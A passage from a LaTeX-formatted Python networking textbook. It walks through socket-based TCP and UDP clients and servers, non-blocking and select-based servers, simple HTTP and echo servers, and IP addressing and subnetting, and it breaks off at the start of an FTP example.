\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ socket}

\CommentTok{\# Define the host and port}
\NormalTok{HOST }\OperatorTok{=} \StringTok{\textquotesingle{}127.0.0.1\textquotesingle{}}  \CommentTok{\# The server\textquotesingle{}s hostname or IP address}
\NormalTok{PORT }\OperatorTok{=} \DecValTok{65432}        \CommentTok{\# The port used by the server}

\CommentTok{\# Create a UDP socket}
\ControlFlowTok{with}\NormalTok{ socket.socket(socket.AF\_INET, socket.SOCK\_DGRAM) }\ImportTok{as}\NormalTok{ client\_socket:}
\NormalTok{    client\_socket.sendto(}\StringTok{b\textquotesingle{}Hello, World!\textquotesingle{}}\NormalTok{, (HOST, PORT))}
\NormalTok{    data, server }\OperatorTok{=}\NormalTok{ client\_socket.recvfrom(}\DecValTok{1024}\NormalTok{)}

\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Received: }\SpecialCharTok{\{}\NormalTok{data}\SpecialCharTok{.}\NormalTok{decode()}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Conclusion}\label{conclusion-41}

Understanding the foundations of data communication, network
architectures, and communication protocols is essential for designing
and managing efficient networks. Python's \texttt{socket} library
provides powerful tools for basic network communication, allowing you to
create both TCP and UDP clients and servers. By mastering these concepts
and tools, you can develop robust networked applications that
effectively communicate over the internet.

\bookmarksetup{startatroot}

\chapter{\texorpdfstring{Deep Dive into the \texttt{socket} Python
Module with Respect to Data Communication
Foundations}{Deep Dive into the socket Python Module with Respect to Data Communication Foundations}}\label{deep-dive-into-the-socket-python-module-with-respect-to-data-communication-foundations}

The \texttt{socket} Python module is a fundamental package used to
create networked applications. Understanding this module is crucial for
anyone interested in data communication, as it provides the tools
necessary to implement low-level network communication. This tutorial
will cover the basics of the \texttt{socket} module, how to create
server and client applications, and advanced features such as
non-blocking sockets and handling multiple connections.

\section{Table of Contents}\label{table-of-contents-16}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[introduction-to-sockets-and-data-communication]{Introduction
  to Sockets and Data Communication}
\item
  \hyperref[installing-python-and-the-socket-module]{Installing Python
  and the \texttt{socket} Module}
\item
  \hyperref[basic-concepts]{Basic Concepts}
\item
  \hyperref[creating-a-simple-server]{Creating a Simple Server}
\item
  \hyperref[creating-a-simple-client]{Creating a Simple Client}
\item
  \hyperref[communication-between-server-and-client]{Communication
  Between Server and Client}
\item
  \hyperref[non-blocking-sockets]{Non-Blocking Sockets}
\item
  \hyperref[handling-multiple-connections]{Handling Multiple
  Connections}
\item
  \hyperref[practical-examples]{Practical Examples}
\item
  \hyperref[best-practices]{Best Practices}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{Introduction to Sockets and Data
Communication}\label{introduction-to-sockets-and-data-communication}

Sockets are the foundation of modern network communication. They allow
applications to communicate with each other over a network. A socket is
one endpoint of a two-way communication link between two programs
running on the network. Sockets can be used to implement various
communication protocols, including TCP and UDP.

\begin{itemize}
\tightlist
\item
  \textbf{TCP (Transmission Control Protocol)}: A connection-oriented
  protocol that ensures reliable and ordered delivery of data.
\item
  \textbf{UDP (User Datagram Protocol)}: A connectionless protocol that
  provides faster but less reliable data transmission.
\end{itemize}

\section{\texorpdfstring{Installing Python and the \texttt{socket}
Module}{Installing Python and the socket Module}}\label{installing-python-and-the-socket-module}

The \texttt{socket} module is part of Python's standard library, so you
don't need to install anything extra to use it. Make sure you have
Python installed on your system. You can download Python from
\href{https://www.python.org/}{python.org}.

\section{Basic Concepts}\label{basic-concepts}

\subsection{\texorpdfstring{Importing the \texttt{socket}
Module}{Importing the socket Module}}\label{importing-the-socket-module}

To use the \texttt{socket} module, you need to import it:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ socket}
\end{Highlighting}
\end{Shaded}

\subsection{Creating a Socket}\label{creating-a-socket}

A socket can be created using the \texttt{socket.socket()} function.
This function requires two arguments:

\begin{itemize}
\tightlist
\item
  \textbf{Address Family}: The family of protocols (e.g.,
  \texttt{socket.AF\_INET} for IPv4).
\item
  \textbf{Socket Type}: The type of socket (e.g.,
  \texttt{socket.SOCK\_STREAM} for TCP, \texttt{socket.SOCK\_DGRAM} for
  UDP).
\end{itemize}

\subsection{Example}\label{example-52}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{s }\OperatorTok{=}\NormalTok{ socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)}
\end{Highlighting}
\end{Shaded}

\subsection{Binding to an Address}\label{binding-to-an-address}

For a server, you need to bind the socket to an address and port number
using the \texttt{bind()} method.

\subsection{Example}\label{example-53}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{s.bind((}\StringTok{\textquotesingle{}localhost\textquotesingle{}}\NormalTok{, }\DecValTok{12345}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

\subsection{Listening for Connections}\label{listening-for-connections}

After binding, a server socket needs to listen for incoming connections
using the \texttt{listen()} method.

\subsection{Example}\label{example-54}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{s.listen(}\DecValTok{5}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Accepting Connections}\label{accepting-connections}

To accept a connection, use the \texttt{accept()} method, which returns
a new socket object and the address of the client.

\subsection{Example}\label{example-55}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{conn, addr }\OperatorTok{=}\NormalTok{ s.accept()}
\end{Highlighting}
\end{Shaded}

\subsection{Sending and Receiving
Data}\label{sending-and-receiving-data}

\begin{itemize}
\tightlist
\item
  \textbf{send()}: Sends data to the connected socket.
\item
  \textbf{recv()}: Receives data from the connected socket.
\end{itemize}

\subsection{Example}\label{example-56}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{conn.send(}\StringTok{b\textquotesingle{}Hello, World!\textquotesingle{}}\NormalTok{)}
\NormalTok{data }\OperatorTok{=}\NormalTok{ conn.recv(}\DecValTok{1024}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(data)}
\end{Highlighting}
\end{Shaded}

\section{Creating a Simple Server}\label{creating-a-simple-server}

Here is a complete example of a simple server that listens on a
specified port and sends a message to any client that connects:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ socket}

\KeywordTok{def}\NormalTok{ simple\_server():}
\NormalTok{    s }\OperatorTok{=}\NormalTok{ socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)}
\NormalTok{    s.bind((}\StringTok{\textquotesingle{}localhost\textquotesingle{}}\NormalTok{, }\DecValTok{12345}\NormalTok{))}
\NormalTok{    s.listen(}\DecValTok{5}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Server is listening on port 12345..."}\NormalTok{)}
    
    \ControlFlowTok{while} \VariableTok{True}\NormalTok{:}
\NormalTok{        conn, addr }\OperatorTok{=}\NormalTok{ s.accept()}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Connected by }\SpecialCharTok{\{}\NormalTok{addr}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\NormalTok{        conn.send(}\StringTok{b\textquotesingle{}Hello, World!\textquotesingle{}}\NormalTok{)}
\NormalTok{        conn.close()}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    simple\_server()}
\end{Highlighting}
\end{Shaded}

\section{Creating a Simple Client}\label{creating-a-simple-client}

Here is a simple client that connects to the server and receives a
message:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ socket}

\KeywordTok{def}\NormalTok{ simple\_client():}
\NormalTok{    s }\OperatorTok{=}\NormalTok{ socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)}
\NormalTok{    s.}\ExtensionTok{connect}\NormalTok{((}\StringTok{\textquotesingle{}localhost\textquotesingle{}}\NormalTok{, }\DecValTok{12345}\NormalTok{))}
\NormalTok{    data }\OperatorTok{=}\NormalTok{ s.recv(}\DecValTok{1024}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Received: }\SpecialCharTok{\{}\NormalTok{data}\SpecialCharTok{.}\NormalTok{decode()}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\NormalTok{    s.close()}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    simple\_client()}
\end{Highlighting}
\end{Shaded}

\section{Communication Between Server and
Client}\label{communication-between-server-and-client}

In a real-world application, communication between the server and client
involves a loop where both parties can send and receive messages. Here
is an example that demonstrates this:

\subsection{Server}\label{server}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ socket}

\KeywordTok{def}\NormalTok{ chat\_server():}
\NormalTok{    s }\OperatorTok{=}\NormalTok{ socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)}
\NormalTok{    s.bind((}\StringTok{\textquotesingle{}localhost\textquotesingle{}}\NormalTok{, }\DecValTok{12345}\NormalTok{))}
\NormalTok{    s.listen(}\DecValTok{5}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Chat server is listening on port 12345..."}\NormalTok{)}
    
\NormalTok{    conn, addr }\OperatorTok{=}\NormalTok{ s.accept()}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Connected by }\SpecialCharTok{\{}\NormalTok{addr}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
    
    \ControlFlowTok{while} \VariableTok{True}\NormalTok{:}
\NormalTok{        data }\OperatorTok{=}\NormalTok{ conn.recv(}\DecValTok{1024}\NormalTok{)}
        \ControlFlowTok{if} \KeywordTok{not}\NormalTok{ data:}
            \ControlFlowTok{break}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Client: }\SpecialCharTok{\{}\NormalTok{data}\SpecialCharTok{.}\NormalTok{decode()}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\NormalTok{        response }\OperatorTok{=} \BuiltInTok{input}\NormalTok{(}\StringTok{"You: "}\NormalTok{)}
\NormalTok{        conn.send(response.encode())}
    
\NormalTok{    conn.close()}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    chat\_server()}
\end{Highlighting}
\end{Shaded}

\subsection{Client}\label{client}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ socket}

\KeywordTok{def}\NormalTok{ chat\_client():}
\NormalTok{    s }\OperatorTok{=}\NormalTok{ socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)}
\NormalTok{    s.}\ExtensionTok{connect}\NormalTok{((}\StringTok{\textquotesingle{}localhost\textquotesingle{}}\NormalTok{, }\DecValTok{12345}\NormalTok{))}
    
    \ControlFlowTok{while} \VariableTok{True}\NormalTok{:}
\NormalTok{        message }\OperatorTok{=} \BuiltInTok{input}\NormalTok{(}\StringTok{"You: "}\NormalTok{)}
\NormalTok{        s.send(message.encode())}
\NormalTok{        data }\OperatorTok{=}\NormalTok{ s.recv(}\DecValTok{1024}\NormalTok{)}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Server: }\SpecialCharTok{\{}\NormalTok{data}\SpecialCharTok{.}\NormalTok{decode()}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
    
\NormalTok{    s.close()}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    chat\_client()}
\end{Highlighting}
\end{Shaded}

\section{Non-Blocking Sockets}\label{non-blocking-sockets}

Non-blocking sockets allow your application to continue running while it
waits for network events. This can be useful for handling multiple
connections simultaneously without using multiple threads or processes.

\subsection{Example}\label{example-57}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ socket}

\KeywordTok{def}\NormalTok{ non\_blocking\_server():}
\NormalTok{    s }\OperatorTok{=}\NormalTok{ socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)}
\NormalTok{    s.setblocking(}\DecValTok{0}\NormalTok{)}
\NormalTok{    s.bind((}\StringTok{\textquotesingle{}localhost\textquotesingle{}}\NormalTok{, }\DecValTok{12345}\NormalTok{))}
\NormalTok{    s.listen(}\DecValTok{5}\NormalTok{)}
    
\NormalTok{    inputs }\OperatorTok{=}\NormalTok{ [s]}
\NormalTok{    outputs }\OperatorTok{=}\NormalTok{ []}
    
    \ControlFlowTok{while}\NormalTok{ inputs:}
\NormalTok{        readable, writable, exceptional }\OperatorTok{=}\NormalTok{ select.select(inputs, outputs, inputs)}
        
        \ControlFlowTok{for}\NormalTok{ sock }\KeywordTok{in}\NormalTok{ readable:}
            \ControlFlowTok{if}\NormalTok{ sock }\KeywordTok{is}\NormalTok{ s:}
\NormalTok{                conn, addr }\OperatorTok{=}\NormalTok{ s.accept()}
\NormalTok{                conn.setblocking(}\DecValTok{0}\NormalTok{)}
\NormalTok{                inputs.append(conn)}
            \ControlFlowTok{else}\NormalTok{:}
\NormalTok{                data }\OperatorTok{=}\NormalTok{ sock.recv(}\DecValTok{1024}\NormalTok{)}
                \ControlFlowTok{if}\NormalTok{ data:}
\NormalTok{                    sock.send(data)}
                \ControlFlowTok{else}\NormalTok{:}
\NormalTok{                    inputs.remove(sock)}
\NormalTok{                    sock.close()}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    non\_blocking\_server()}
\end{Highlighting}
\end{Shaded}

\section{Handling Multiple
Connections}\label{handling-multiple-connections}

To handle multiple connections efficiently, you can use the
\texttt{select} module, which allows you to monitor multiple sockets for
readability, writability, and exceptional conditions.

\subsection{Example}\label{example-58}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ socket}
\ImportTok{import}\NormalTok{ select}

\KeywordTok{def}\NormalTok{ multi\_client\_server():}
\NormalTok{    s }\OperatorTok{=}\NormalTok{ socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)}
\NormalTok{    s.bind((}\StringTok{\textquotesingle{}localhost\textquotesingle{}}\NormalTok{, }\DecValTok{12345}\NormalTok{))}
\NormalTok{    s.listen(}\DecValTok{5}\NormalTok{)}
    
\NormalTok{    inputs }\OperatorTok{=}\NormalTok{ [s]}
\NormalTok{    outputs }\OperatorTok{=}\NormalTok{ []}
    
    \ControlFlowTok{while}\NormalTok{ inputs:}
\NormalTok{        readable, writable, exceptional }\OperatorTok{=}\NormalTok{ select.select(inputs, outputs, inputs)}
        
        \ControlFlowTok{for}\NormalTok{ sock }\KeywordTok{in}\NormalTok{ readable:}
            \ControlFlowTok{if}\NormalTok{ sock }\KeywordTok{is}\NormalTok{ s:}
\NormalTok{                conn, addr }\OperatorTok{=}\NormalTok{ s.accept()}
                \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Connected by }\SpecialCharTok{\{}\NormalTok{addr}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\NormalTok{                inputs.append(conn)}
            \ControlFlowTok{else}\NormalTok{:}
\NormalTok{                data }\OperatorTok{=}\NormalTok{ sock.recv(}\DecValTok{1024}\NormalTok{)}
                \ControlFlowTok{if}\NormalTok{ data:}
\NormalTok{                    sock.send(data)}
                \ControlFlowTok{else}\NormalTok{:}
\NormalTok{                    inputs.remove(sock)}
\NormalTok{                    sock.close()}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    multi\_client\_server()}
\end{Highlighting}
\end{Shaded}

\section{Practical Examples}\label{practical-examples-9}

\subsection{Example 1: Simple HTTP
Server}\label{example-1-simple-http-server}

This example demonstrates how to create a simple HTTP server that
responds to GET requests.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ socket}

\KeywordTok{def}\NormalTok{ http\_server():}
\NormalTok{    s }\OperatorTok{=}\NormalTok{ socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)}
\NormalTok{    s.bind((}\StringTok{\textquotesingle{}localhost\textquotesingle{}}\NormalTok{, }\DecValTok{8080}\NormalTok{))}
\NormalTok{    s.listen(}\DecValTok{5}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"HTTP server is listening on port 8080..."}\NormalTok{)}
    
    \ControlFlowTok{while} \VariableTok{True}\NormalTok{:}
\NormalTok{        conn, addr }\OperatorTok{=}\NormalTok{ s.accept()}
\NormalTok{        request }\OperatorTok{=}\NormalTok{ conn.recv(}\DecValTok{1024}\NormalTok{).decode()}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Request from }\SpecialCharTok{\{}\NormalTok{addr}\SpecialCharTok{\}}\SpecialStringTok{: }\SpecialCharTok{\{}\NormalTok{request}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
        
\NormalTok{        response }\OperatorTok{=} \StringTok{\textquotesingle{}HTTP/1.0 200 OK}\CharTok{\textbackslash{}n\textbackslash{}n}\StringTok{Hello, World!\textquotesingle{}}
\NormalTok{        conn.send(response.encode())}
\NormalTok{        conn.close()}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    http\_server()}
\end{Highlighting}
\end{Shaded}

\subsection{Example 2: Echo Server with
Timeout}\label{example-2-echo-server-with-timeout}

This example demonstrates how to create an echo server with a timeout
feature.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ socket}

\KeywordTok{def}\NormalTok{ echo\_server\_with\_timeout():}
\NormalTok{    s }\OperatorTok{=}\NormalTok{ socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)}
\NormalTok{    s.bind((}\StringTok{\textquotesingle{}localhost\textquotesingle{}}\NormalTok{, }\DecValTok{12345}\NormalTok{))}
\NormalTok{    s.listen(}\DecValTok{5}\NormalTok{)}
\NormalTok{    s.settimeout(}\DecValTok{10}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Echo server is listening on port 12345..."}\NormalTok{)}
    
    \ControlFlowTok{try}\NormalTok{:}
        \ControlFlowTok{while} \VariableTok{True}\NormalTok{:}
\NormalTok{            conn, addr }\OperatorTok{=}\NormalTok{ s.accept()}
            \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Connected by }\SpecialCharTok{\{}\NormalTok{addr}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
            \ControlFlowTok{while} \VariableTok{True}\NormalTok{:}
\NormalTok{                data }\OperatorTok{=}\NormalTok{ conn.recv(}\DecValTok{1024}\NormalTok{)}
                \ControlFlowTok{if} \KeywordTok{not}\NormalTok{ data:}
                    \ControlFlowTok{break}
\NormalTok{                conn.send(data)}
\NormalTok{            conn.close()}
    \ControlFlowTok{except}\NormalTok{ socket.timeout:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Connection timed out"}\NormalTok{)}
    \ControlFlowTok{finally}\NormalTok{:}
\NormalTok{        s.close()}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    echo\_server\_with\_timeout()}
\end{Highlighting}
\end{Shaded}

\section{Best Practices}\label{best-practices-8}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Error Handling}: Always include error handling in your socket
  applications to manage unexpected conditions gracefully.
\item
  \textbf{Resource Management}: Ensure sockets are properly closed to
  free up resources.
\item
  \textbf{Security}: Be mindful of security
\end{enumerate}

concerns, such as data encryption and validation, especially when
dealing with public networks. 4. \textbf{Concurrency}: Use non-blocking
sockets or threading/multiprocessing to handle multiple connections
efficiently. 5. \textbf{Documentation}: Document your code to make it
easier to understand and maintain.

\section{Conclusion}\label{conclusion-42}

The \texttt{socket} module is a powerful tool for creating networked
applications in Python. By understanding the basics and advanced
features of this module, you can implement robust data communication
solutions. Whether you are building a simple chat application or a
complex server, the \texttt{socket} module provides the necessary
functionality to handle network communication effectively.

\bookmarksetup{startatroot}

\chapter{Network Architecture and Protocols with
Python}\label{network-architecture-and-protocols-with-python}

Understanding network architecture and protocols is crucial for
designing and managing efficient networks. This tutorial will cover key
concepts in network architecture, including IP addressing, subnetting,
and routing algorithms. It will also delve into transport layer topics
like TCP/UDP protocols, flow control, and error control, and explore
application layer protocols such as HTTP, FTP, and SMTP. We'll use
Python libraries like \texttt{scapy} for network packet analysis and
\texttt{socket} for implementing TCP and UDP clients and servers.

\subsection{Network Layer Topics}\label{network-layer-topics}

\subsubsection{IP Addressing}\label{ip-addressing}

IP addressing is the method by which devices on a network are
identified. IPv4 addresses are 32-bit numbers usually represented in
dot-decimal notation (e.g., 192.168.1.1).

\paragraph{Example: Displaying Local IP
Address}\label{example-displaying-local-ip-address}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ socket}

\NormalTok{hostname }\OperatorTok{=}\NormalTok{ socket.gethostname()}
\NormalTok{local\_ip }\OperatorTok{=}\NormalTok{ socket.gethostbyname(hostname)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Local IP Address: }\SpecialCharTok{\{}\NormalTok{local\_ip}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Subnetting}\label{subnetting}

Subnetting divides a network into smaller sub-networks (subnets) to
improve management and security. Subnets are defined by their subnet
mask.

\paragraph{Example: Calculating Subnet
Information}\label{example-calculating-subnet-information}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ ipaddress}

\NormalTok{network }\OperatorTok{=}\NormalTok{ ipaddress.ip\_network(}\StringTok{\textquotesingle{}192.168.1.0/24\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Network: }\SpecialCharTok{\{}\NormalTok{network}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Netmask: }\SpecialCharTok{\{}\NormalTok{network}\SpecialCharTok{.}\NormalTok{netmask}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Broadcast: }\SpecialCharTok{\{}\NormalTok{network}\SpecialCharTok{.}\NormalTok{broadcast\_address}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Hosts: }\SpecialCharTok{\{}\BuiltInTok{list}\NormalTok{(network.hosts())[:}\DecValTok{5}\NormalTok{]}\SpecialCharTok{\}}\SpecialStringTok{..."}\NormalTok{)  }\CommentTok{\# Display first 5 hosts}
\end{Highlighting}
\end{Shaded}

\subsubsection{Routing Algorithms}\label{routing-algorithms}

Routing algorithms determine the best path for data to travel across a
network. Common algorithms include Distance Vector Routing and Link
State Routing.

\subsection{Transport Layer Topics}\label{transport-layer-topics}

\subsubsection{TCP/UDP Protocols}\label{tcpudp-protocols}

TCP (Transmission Control Protocol) and UDP (User Datagram Protocol) are
key transport layer protocols. TCP is connection-oriented and reliable,
while UDP is connectionless and faster but less reliable.

\paragraph{Example: TCP Client and
Server}\label{example-tcp-client-and-server}

\textbf{TCP Server:}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ socket}

\NormalTok{server\_socket }\OperatorTok{=}\NormalTok{ socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)}
\NormalTok{server\_socket.bind((}\StringTok{\textquotesingle{}127.0.0.1\textquotesingle{}}\NormalTok{, }\DecValTok{65432}\NormalTok{))}
\NormalTok{server\_socket.listen()}

\BuiltInTok{print}\NormalTok{(}\StringTok{"TCP Server listening on port 65432"}\NormalTok{)}

\ControlFlowTok{while} \VariableTok{True}\NormalTok{:}
\NormalTok{    conn, addr }\OperatorTok{=}\NormalTok{ server\_socket.accept()}
    \ControlFlowTok{with}\NormalTok{ conn:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Connected by }\SpecialCharTok{\{}\NormalTok{addr}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\NormalTok{        data }\OperatorTok{=}\NormalTok{ conn.recv(}\DecValTok{1024}\NormalTok{)}
        \ControlFlowTok{if} \KeywordTok{not}\NormalTok{ data:}
            \ControlFlowTok{break}
\NormalTok{        conn.sendall(data)}
\end{Highlighting}
\end{Shaded}

\textbf{TCP Client:}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ socket}

\NormalTok{client\_socket }\OperatorTok{=}\NormalTok{ socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)}
\NormalTok{client\_socket.}\ExtensionTok{connect}\NormalTok{((}\StringTok{\textquotesingle{}127.0.0.1\textquotesingle{}}\NormalTok{, }\DecValTok{65432}\NormalTok{))}
\NormalTok{client\_socket.sendall(}\StringTok{b\textquotesingle{}Hello, World!\textquotesingle{}}\NormalTok{)}
\NormalTok{data }\OperatorTok{=}\NormalTok{ client\_socket.recv(}\DecValTok{1024}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Received: }\SpecialCharTok{\{}\NormalTok{data}\SpecialCharTok{.}\NormalTok{decode()}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\paragraph{Example: UDP Client and
Server}\label{example-udp-client-and-server}

\textbf{UDP Server:}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ socket}

\NormalTok{server\_socket }\OperatorTok{=}\NormalTok{ socket.socket(socket.AF\_INET, socket.SOCK\_DGRAM)}
\NormalTok{server\_socket.bind((}\StringTok{\textquotesingle{}127.0.0.1\textquotesingle{}}\NormalTok{, }\DecValTok{65432}\NormalTok{))}

\BuiltInTok{print}\NormalTok{(}\StringTok{"UDP Server listening on port 65432"}\NormalTok{)}

\ControlFlowTok{while} \VariableTok{True}\NormalTok{:}
\NormalTok{    data, addr }\OperatorTok{=}\NormalTok{ server\_socket.recvfrom(}\DecValTok{1024}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Received from }\SpecialCharTok{\{}\NormalTok{addr}\SpecialCharTok{\}}\SpecialStringTok{: }\SpecialCharTok{\{}\NormalTok{data}\SpecialCharTok{.}\NormalTok{decode()}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\NormalTok{    server\_socket.sendto(data, addr)}
\end{Highlighting}
\end{Shaded}

\textbf{UDP Client:}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ socket}

\NormalTok{client\_socket }\OperatorTok{=}\NormalTok{ socket.socket(socket.AF\_INET, socket.SOCK\_DGRAM)}
\NormalTok{client\_socket.sendto(}\StringTok{b\textquotesingle{}Hello, World!\textquotesingle{}}\NormalTok{, (}\StringTok{\textquotesingle{}127.0.0.1\textquotesingle{}}\NormalTok{, }\DecValTok{65432}\NormalTok{))}
\NormalTok{data, server }\OperatorTok{=}\NormalTok{ client\_socket.recvfrom(}\DecValTok{1024}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Received: }\SpecialCharTok{\{}\NormalTok{data}\SpecialCharTok{.}\NormalTok{decode()}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Flow Control and Error
Control}\label{flow-control-and-error-control}

Flow control ensures data is sent at a rate that the receiver can
handle. Error control detects and corrects errors in transmitted data.
TCP implements both flow control (using windowing) and error control
(using checksums and acknowledgments).

\subsection{Application Layer
Protocols}\label{application-layer-protocols}

\subsubsection{HTTP (Hypertext Transfer
Protocol)}\label{http-hypertext-transfer-protocol}

HTTP is the foundation of data communication on the web.

\paragraph{\texorpdfstring{Example: Simple HTTP GET Request using
\texttt{socket}}{Example: Simple HTTP GET Request using socket}}\label{example-simple-http-get-request-using-socket}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ socket}

\NormalTok{request }\OperatorTok{=} \StringTok{"GET / HTTP/1.1}\CharTok{\textbackslash{}r\textbackslash{}n}\StringTok{Host: www.example.com}\CharTok{\textbackslash{}r\textbackslash{}n\textbackslash{}r\textbackslash{}n}\StringTok{"}
\NormalTok{client\_socket }\OperatorTok{=}\NormalTok{ socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)}
\NormalTok{client\_socket.}\ExtensionTok{connect}\NormalTok{((}\StringTok{\textquotesingle{}www.example.com\textquotesingle{}}\NormalTok{, }\DecValTok{80}\NormalTok{))}
\NormalTok{client\_socket.sendall(request.encode())}
\NormalTok{response }\OperatorTok{=}\NormalTok{ client\_socket.recv(}\DecValTok{4096}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(response.decode())}
\end{Highlighting}
\end{Shaded}

\subsubsection{FTP (File Transfer
Protocol)}\label{ftp-file-transfer-protocol}

FTP is used for transferring files between a client and server.

\paragraph{\texorpdfstring{Example: Simple FTP Interaction using
\texttt{ftplib}}{Example: Simple FTP Interaction using ftplib}}\label{example-simple-ftp-interaction-using-ftplib}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ ftplib }\ImportTok{import}\NormalTok{ FTP}

